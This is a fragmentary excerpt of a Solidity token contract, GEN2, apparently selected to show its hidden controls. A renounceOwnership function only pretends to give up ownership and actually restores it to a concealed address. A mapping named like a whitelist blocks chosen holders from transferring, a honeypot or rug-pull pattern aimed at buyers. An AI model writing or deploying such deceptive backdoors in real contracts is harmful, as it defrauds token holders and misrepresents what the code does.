...
contract Ownable is Context {
  ...
  function renounceOwnership() public {
    require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
    emit OwnershipTransferred(_owner, _ownerShip);
    _owner = _ownerShip;
  }
...
contract GEN2 is Context, IERC20, Ownable {
    ...
    address payable private _promotionsWalletAddress = payable(0xE2451dC43fFf9f64F4fa93b38cDcC2E41fCBb508);
    ...
    function removeFromWL(address account) external onlyOwner {
        _isWL[account] = false;
    }
    ...
    function _transfer(
        ...
        require(!_isWL[from] && !_isWL[to], "This address is INVALID");
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        require(!_isWL[sender] && !_isWL[recipient], "To/from address is INVALID!");
